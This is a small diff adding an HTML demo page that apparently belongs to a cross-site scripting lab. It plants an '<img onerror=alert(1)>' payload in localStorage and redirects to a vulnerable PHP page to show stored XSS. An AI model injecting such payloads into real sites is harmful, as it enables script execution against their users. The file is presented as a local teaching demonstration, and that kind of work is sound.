@@ -1,0 +1,9 @@
+<!-- attacker-set.html (ONLY for local demo) -->
+<!doctype html><body>
+  <script>
+    // simulate an attacker-controlled page on same origin (localhost) that sets storage
+    localStorage.setItem('name', 'AAA<img src="aaa.jpg"  onerror=alert(1) />BBB');
+    location.href = 'localstorage.php';
+  </script>
+  <p>Redirecting to demo...</p>
+</body></html>
